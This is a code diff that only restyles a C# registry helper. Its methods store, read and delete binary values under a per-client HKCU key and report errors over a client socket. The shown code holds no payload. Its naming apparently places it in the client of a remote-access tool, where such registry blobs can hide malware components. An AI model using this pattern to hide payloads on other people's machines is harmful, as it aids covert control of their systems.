@@ -1,6 +1,6 @@
-﻿using Microsoft.Win32;
+﻿using System;
 using Client.Connection;
-using System;
+using Microsoft.Win32;
 
 namespace Client.Helper
 {
@@ -12,7 +12,7 @@ namespace Client.Helper
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                using (var key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
                 {
                     key.SetValue(name, value, RegistryValueKind.Binary);
                     return true;
@@ -22,6 +22,7 @@ namespace Client.Helper
             {
                 ClientSocket.Error(ex.Message);
             }
+
             return false;
         }
 
@@ -29,9 +30,9 @@ namespace Client.Helper
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
+                using (var key = Registry.CurrentUser.CreateSubKey(ID))
                 {
-                    object o = key.GetValue(value);
+                    var o = key.GetValue(value);
                     return (byte[])o;
                 }
             }
@@ -39,6 +40,7 @@ namespace Client.Helper
             {
                 ClientSocket.Error(ex.Message);
             }
+
             return null;
         }
 
@@ -46,7 +48,7 @@ namespace Client.Helper
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
+                using (var key = Registry.CurrentUser.CreateSubKey(ID))
                 {
                     key.DeleteValue(name);
                     return true;
@@ -56,6 +58,7 @@ namespace Client.Helper
             {
                 ClientSocket.Error(ex.Message);
             }
+
             return false;
         }
 
@@ -63,7 +66,7 @@ namespace Client.Helper
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("", true))
+                using (var key = Registry.CurrentUser.OpenSubKey("", true))
                 {
                     key.DeleteSubKeyTree(ID);
                     return true;
@@ -73,6 +76,7 @@ namespace Client.Helper
             {
                 ClientSocket.Error(ex.Message);
             }
+
             return false;
         }
     }
